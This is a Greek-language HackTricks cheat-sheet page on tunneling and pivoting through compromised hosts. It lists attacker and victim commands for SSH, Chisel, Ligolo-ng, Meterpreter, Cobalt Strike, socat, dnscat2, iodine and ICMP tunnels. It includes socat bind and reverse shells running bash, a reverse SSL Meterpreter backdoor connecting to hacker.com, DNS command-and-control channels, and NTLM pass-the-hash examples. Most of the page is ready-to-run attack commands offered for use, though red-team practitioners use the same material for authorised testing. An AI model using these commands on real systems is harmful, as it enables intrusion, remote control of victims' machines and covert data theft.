# Tunneling and Port Forwarding

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Nmap tip

{% hint style="warning" %}
**ICMP** και **SYN** σάρωσεις δεν μπορούν να περάσουν μέσω των socks proxies, οπότε πρέπει να **απενεργοποιήσουμε την ανακάλυψη ping** (`-Pn`) και να καθορίσουμε **TCP σάρωσεις** (`-sT`) για να λειτουργήσει αυτό.
{% endhint %}

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH γραφική σύνδεση (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Άνοιγμα νέας Θύρας στον SSH Server --> Άλλη θύρα
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Τοπική θύρα --> Συμβιβασμένος υπολογιστής (SSH) --> Τρίτο\_κουτί:Θύρα
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Τοπική Θύρα --> Συμβιβασμένος υπολογιστής (SSH) --> Οπουδήποτε
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Αντίστροφη Προώθηση Θυρών

Αυτό είναι χρήσιμο για να αποκτήσετε αντίστροφες θήκες από εσωτερικούς υπολογιστές μέσω μιας DMZ στον υπολογιστή σας:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Χρειάζεστε **root και στις δύο συσκευές** (καθώς πρόκειται να δημιουργήσετε νέες διεπαφές) και η ρύθμιση του sshd πρέπει να επιτρέπει την είσοδο του root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Ενεργοποιήστε την προώθηση στην πλευρά του διακομιστή
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Ορίστε μια νέα διαδρομή στην πλευρά του πελάτη
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Μπορείτε να **tunnel** μέσω **ssh** όλη την **κυκλοφορία** σε ένα **υποδίκτυο** μέσω ενός host.\
Για παράδειγμα, προωθώντας όλη την κυκλοφορία που πηγαίνει στο 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Συνδεθείτε με ένα ιδιωτικό κλειδί
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Τοπική θύρα --> Συμβιβασμένος υπολογιστής (ενεργή συνεδρία) --> Τρίτο\_κουτί:Θύρα
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Άλλος τρόπος:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Ανοίξτε μια θύρα στον server της ομάδας που ακούει σε όλα τα interfaces που μπορούν να χρησιμοποιηθούν για να **δρομολογήσουν την κίνηση μέσω του beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
Σε αυτή την περίπτωση, το **θύρα ανοίγει στον host beacon**, όχι στον Team Server και η κίνηση αποστέλλεται στον Team Server και από εκεί στον καθορισμένο host:port
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
To note:

- Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **συνδέει την κίνηση στον Server Ομάδας, όχι για αναμετάδοση μεταξύ μεμονωμένων μηχανών**.
- Η κίνηση είναι **συνδεδεμένη μέσα στην κίνηση C2 του Beacon**, συμπεριλαμβανομένων των P2P συνδέσεων.
- **Δικαιώματα διαχειριστή δεν απαιτούνται** για τη δημιουργία αντίστροφων προωθήσεων θύρας σε υψηλές θύρες.

### rPort2Port local

{% hint style="warning" %}
Σε αυτή την περίπτωση, η **θύρα ανοίγεται στον οικοδεσπότη beacon**, όχι στον Server Ομάδας και η **κίνηση αποστέλλεται στον πελάτη Cobalt Strike** (όχι στον Server Ομάδας) και από εκεί στον καθορισμένο host:port
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Πρέπει να ανεβάσετε ένα αρχείο ιστού tunnel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Μπορείτε να το κατεβάσετε από τη σελίδα εκδόσεων του [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Πρέπει να χρησιμοποιήσετε την **ίδια έκδοση για πελάτη και διακομιστή**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Προώθηση θύρας
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Χρησιμοποιήστε την ίδια έκδοση για τον πράκτορα και τον διακομιστή μεσολάβησης**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Σύνδεση και Ακρόαση Πράκτορα
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Αντίστροφη σήραγγα. Η σήραγγα ξεκινά από το θύμα.\
Δημιουργείται ένα socks4 proxy στο 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot through **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Δεσμός κελύφους
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Αντίστροφη θήκη
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port μέσω socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter μέσω SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Μπορείτε να παρακάμψετε έναν **μη αυθεντικοποιημένο διακομιστή μεσολάβησης** εκτελώντας αυτή τη γραμμή αντί για την τελευταία στην κονσόλα του θύματος:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh κονσόλα**

Δημιουργήστε πιστοποιητικά και στις δύο πλευρές: Πελάτης και Διακομιστής
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Συνδέστε την τοπική θύρα SSH (22) με την θύρα 443 του επιτιθέμενου.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Είναι σαν μια κονσόλα PuTTY έκδοση (οι επιλογές είναι πολύ παρόμοιες με έναν ssh πελάτη).

Καθώς αυτό το δυαδικό αρχείο θα εκτελείται στον θύμα και είναι ένας ssh πελάτης, πρέπει να ανοίξουμε την υπηρεσία ssh και την θύρα μας ώστε να μπορέσουμε να έχουμε μια αντίστροφη σύνδεση. Στη συνέχεια, για να προωθήσουμε μόνο την τοπικά προσβάσιμη θύρα σε μια θύρα στη μηχανή μας:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Πρέπει να είστε τοπικός διαχειριστής (για οποιαδήποτε θύρα)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Πρέπει να έχετε **RDP πρόσβαση στο σύστημα**.\
Κατεβάστε:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το εργαλείο χρησιμοποιεί `Dynamic Virtual Channels` (`DVC`) από τη δυνατότητα Remote Desktop Service των Windows. Το DVC είναι υπεύθυνο για **tunneling πακέτων μέσω της σύνδεσης RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Στον υπολογιστή-πελάτη σας φορτώστε **`SocksOverRDP-Plugin.dll`** όπως αυτό:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Τώρα μπορούμε να **συνδεθούμε** με το **θύμα** μέσω **RDP** χρησιμοποιώντας **`mstsc.exe`**, και θα πρέπει να λάβουμε μια **προτροπή** που λέει ότι το **SocksOverRDP plugin είναι ενεργοποιημένο**, και θα **ακούει** στη διεύθυνση **127.0.0.1:1080**.

**Συνδεθείτε** μέσω **RDP** και ανεβάστε & εκτελέστε στο μηχάνημα του θύματος το δυαδικό αρχείο `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Τώρα, επιβεβαιώστε στη μηχανή σας (επιτιθέμενος) ότι η θύρα 1080 ακούει:
```
netstat -antb | findstr 1080
```
Τώρα μπορείτε να χρησιμοποιήσετε [**Proxifier**](https://www.proxifier.com/) **για να προξενήσετε την κίνηση μέσω αυτού του θύρας.**

## Προξενήστε εφαρμογές Windows GUI

Μπορείτε να κάνετε τις εφαρμογές Windows GUI να περιηγούνται μέσω ενός proxy χρησιμοποιώντας [**Proxifier**](https://www.proxifier.com/).\
Στο **Profile -> Proxy Servers** προσθέστε τη διεύθυνση IP και τη θύρα του διακομιστή SOCKS.\
Στο **Profile -> Proxification Rules** προσθέστε το όνομα του προγράμματος που θέλετε να προξενήσετε και τις συνδέσεις στις διευθύνσεις IP που θέλετε να προξενήσετε.

## Παράκαμψη proxy NTLM

Το προηγουμένως αναφερόμενο εργαλείο: **Rpivot**\
**OpenVPN** μπορεί επίσης να το παρακάμψει, ρυθμίζοντας αυτές τις επιλογές στο αρχείο ρύθμισης.
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Αυτή η εφαρμογή αυθεντικοποιείται έναντι ενός proxy και δεσμεύει μια θύρα τοπικά που προωθείται στην εξωτερική υπηρεσία που καθορίζετε. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το εργαλείο της επιλογής σας μέσω αυτής της θύρας.\
Για παράδειγμα, προωθήστε τη θύρα 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Τώρα, αν ρυθμίσετε για παράδειγμα στο θύμα την υπηρεσία **SSH** να ακούει στην πόρτα 443. Μπορείτε να συνδεθείτε σε αυτή μέσω της θύρας του επιτιθέμενου 2222.\
Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο επιτιθέμενος ακούει στην πόρτα 2222.

## YARP

Ένας αντίστροφος διακομιστής που δημιουργήθηκε από τη Microsoft. Μπορείτε να τον βρείτε εδώ: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Απαιτείται root και στα δύο συστήματα για να δημιουργηθούν προσαρμογείς tun και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας ερωτήματα DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Ο σωλήνας θα είναι πολύ αργός. Μπορείτε να δημιουργήσετε μια συμπιεσμένη σύνδεση SSH μέσω αυτού του σωλήνα χρησιμοποιώντας:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Κατεβάστε το από εδώ**](https://github.com/iagox86/dnscat2)**.**

Δημιουργεί ένα κανάλι C\&C μέσω DNS. Δεν απαιτεί δικαιώματα root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **Στο PowerShell**

Μπορείτε να χρησιμοποιήσετε [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) για να εκτελέσετε έναν πελάτη dnscat2 στο powershell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Προώθηση θύρας με dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Αλλαγή DNS του proxychains

Το Proxychains παρεμβαίνει στην κλήση `gethostbyname` της libc και στέλνει τα αιτήματα DNS tcp μέσω του socks proxy. Από **προεπιλογή**, ο **DNS** διακομιστής που χρησιμοποιεί το proxychains είναι **4.2.2.2** (σκληρά κωδικοποιημένος). Για να τον αλλάξετε, επεξεργαστείτε το αρχείο: _/usr/lib/proxychains3/proxyresolv_ και αλλάξτε τη διεύθυνση IP. Αν βρίσκεστε σε **περιβάλλον Windows**, μπορείτε να ορίσετε τη διεύθυνση IP του **domain controller**.

## Τούνελ σε Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Απαιτείται root και στα δύο συστήματα για να δημιουργηθούν οι προσαρμογείς tun και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας αιτήματα ICMP echo.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Κατεβάστε το από εδώ**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) είναι ένα εργαλείο για την έκθεση λύσεων στο Διαδίκτυο με μία γραμμή εντολής.**
*Οι URI έκθεσης είναι όπως:* **UID.ngrok.io**

### Εγκατάσταση

- Δημιουργήστε έναν λογαριασμό: https://ngrok.com/signup
- Λήψη πελάτη:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Βασικές χρήσεις

**Τεκμηρίωση:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*Είναι επίσης δυνατή η προσθήκη αυθεντικοποίησης και TLS, αν είναι απαραίτητο.*

#### Τούνελινγκ TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Έκθεση αρχείων με HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

*Χρήσιμο για XSS, SSRF, SSTI ...*
Απευθείας από το stdout ή στη διεπαφή HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling internal HTTP service
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml απλή διαμόρφωση παράδειγμα

Ανοίγει 3 τούνελ:
- 2 TCP
- 1 HTTP με στατική έκθεση αρχείων από /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Άλλα εργαλεία για έλεγχο

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
